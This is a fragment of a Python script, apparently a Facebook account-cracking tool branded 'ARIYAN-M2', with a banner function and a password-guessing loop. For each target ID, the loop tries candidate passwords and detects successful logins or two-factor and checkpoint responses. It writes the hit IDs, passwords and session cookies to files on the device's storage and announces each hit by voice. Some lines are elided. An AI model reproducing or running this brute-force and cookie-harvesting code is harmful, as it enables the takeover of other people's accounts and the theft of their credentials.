...
def logo():
	os.system('clear');print(f"""\r\r\x1b[1;97m{W}          _____  _______     __      _   _ 
     /\   |  __ \|_   _\ \   / //\   | \ | |
    /  \  | |__) | | |  \ \_/ //  \  |  \| |
   / /\ \ |  _  /  | |   \   // /\ \ | . ` |
  / ____ \| | \ \ _| |_   | |/ ____ \| |\  |
...
def graphrm(id,psd,tid):
	global ok,cp,lk,lop
	togg=[]
	sys.stdout.write(f'\r\r{BG}[{W}ARIYAN-M2{BG}]{G}{E}{BG}[{G}{lop}{W}/{G}{tid}{BG}]{E}{BG}[{W}OK{W}:{G}%s{W}/{S}%s{BG}]{E}'%(len(ok),len(lk)));sys.stdout.flush()
	for psw in psd:
		#ua=ua1()
		...
		if 'session_key' in lo:
			...
			print(f'\r\r{G}[ARIYAN-OK] {iid} | {psw}{W}');os.system('espeak -a 300 "ok id"');ok.append(id);open('/sdcard/ARIYAN-OK.txt', 'a').write(iid+' | '+psw+' | '+id+'  ------------>>>'+coki+"\n")
			if 'y' in cokix:print(f'\r\r{R}[{G}COOKIES🍪{R}]{W} : {G}{coki}{E}');print(f"{W}{40*'-'}{E}")
			break
		elif twfx in str(lo):
			iid = lo['error']['error_data']['uid']
			print(f'\r\r{BL}[ARIYAN-2F] {iid} | {psw}{W}');os.system('espeak -a 300 "two,f id"');open('/sdcard/ARIYAN-2F.txt', 'a').write(iid+' | '+psw+' | '+id+"\n")
			twf.append(id)
			break
			...
			if iid in ok:pass
				...
				if 'y' in cpx:
					print(f'\r\r{R}[ARIYAN-CP] {iid} | {psw}{W}');cp.append(id);os.system('espeak -a 300 "cp id"');open('/sdcard/ARIYAN-CP.txt', 'a').write(iid+' | '+psw+' | '+id+"\n")
			break
		else:continue
	lop+=1
Main()
